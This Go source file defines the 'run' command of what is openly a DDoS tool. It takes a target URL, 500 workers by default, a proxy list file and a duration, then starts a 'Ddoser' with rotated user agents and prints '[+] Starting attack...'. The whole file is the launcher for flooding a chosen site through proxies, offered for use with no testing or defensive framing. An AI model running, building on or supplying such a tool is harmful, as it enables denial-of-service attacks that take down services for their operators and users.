package main

import (
	"fmt"
	"time"

	"github.com/symfony-cli/console"
)

var runCommand = &console.Command{
	Name: "run",
	Flags: []console.Flag{
		&console.StringFlag{
			Name:     "url",
			Required: true,
		},
		&console.IntFlag{
			Name:         "worker",
			Aliases:      []string{"w"},
			DefaultValue: 500,
		},
		&console.StringFlag{
			Name:         "file",
			Aliases:      []string{"f"},
			DefaultValue: "http.txt",
		},
		&console.DurationFlag{
			Name:         "duration",
			Aliases:      []string{"d"},
			DefaultValue: time.Second * 10,
		},
	},
	Action: func(c *console.Context) error {
		useragents := getUserAgents(500)
		proxies := readLines(c.String("file"))

		ddoser, err := NewDdoser(c.String("url"), c.Int("worker"), useragents, proxies)
		if err != nil {
			return err
		}

		fmt.Println("[+] Starting attack...")

		ddoser.Run()

		time.Sleep(c.Duration("duration"))

		fmt.Println("[+] Attack finished")

		return nil
	},
}
